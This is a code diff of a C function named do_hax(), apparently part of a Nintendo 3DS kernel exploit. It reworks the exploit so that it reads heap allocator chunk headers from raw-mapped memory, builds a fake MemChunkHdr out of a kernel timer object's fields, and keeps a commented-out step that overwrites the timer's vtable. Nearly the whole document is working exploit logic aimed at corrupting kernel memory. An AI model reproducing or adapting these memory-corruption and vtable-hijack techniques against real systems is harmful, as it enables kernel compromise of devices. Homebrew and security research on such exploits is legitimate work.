@@ -136,19 +136,6 @@ void do_hax() {
     APT_SetAppCpuTimeLimit(30);
     aptCloseSession();
 
-    // Create a timer, crafting a fake MemChunkHdr out of its data.
-    // TODO: Do next/prev *need* to be non-zero?
-    Handle timer;
-    u32 timerAddr;
-    svcCreateTimerKAddr(&timer, 0, &timerAddr);
-    svcSetTimer(timer, 0, 0);
-
-    KTimer* timerObj = (KTimer*) (timerAddr - 4);
-    MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->timerEnabled;
-
-    // Debug output.
-    printf("Timer address: 0x%08X\n", (int) timerAddr);
-
     // Prepare memory details.
     u32 memAddr = __ctru_heap + __ctru_heap_size;
     u32 memSize = PAGE_SIZE * 2;
@@ -157,6 +144,35 @@ void do_hax() {
     svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
     svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
     svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
+
+    // Debug output.
+    printf("Mapping pages for read...\n");
+
+    map_raw_pages(memAddr, memSize);
+    MemChunkHdr hdr = *(MemChunkHdr*) memAddr;
+    wait_map_complete();
+    svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);
+
+    // Debug output.
+    printf("Size: %08X\n", (int) hdr.size);
+    printf("Next: %08X\n", (int) hdr.next);
+    printf("Prev: %08X\n", (int) hdr.prev);
+
+    // Create a timer, crafting a fake MemChunkHdr out of its data.
+    // Prev does not matter, Next must not be null as long as the allocator needs more pages to allocate.
+    Handle timer;
+    u32 timerAddr;
+    svcCreateTimerKAddr(&timer, 0, &timerAddr);
+    svcSetTimer(timer, 0, (s64) (u32) hdr.next);
+
+    KTimer* timerObj = (KTimer*) (timerAddr - 4);
+    MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->timerEnabled;
+
+    // Debug output.
+    printf("Timer address: 0x%08X\n", (int) timerAddr);
+
+    // Debug output.
+    printf("Mapping pages...\n");
 
     // Map the pages.
     map_raw_pages(memAddr, memSize);
@@ -175,8 +191,8 @@ void do_hax() {
 
     // Overwrite the timer's vtable with our own.
     // TODO: This needs to be a kernel virtual address.
-    void*** vtablePtr = (void***) (memAddr + PAGE_SIZE + ((u32) timerObj - ((u32) timerObj & ~0xFFF)));
-    *vtablePtr = vtable;
+    //void*** vtablePtr = (void***) (memAddr + PAGE_SIZE + ((u32) timerObj - ((u32) timerObj & ~0xFFF)));
+    //*vtablePtr = vtable;
 
     // Free the timer.
     svcCloseHandle(timer);
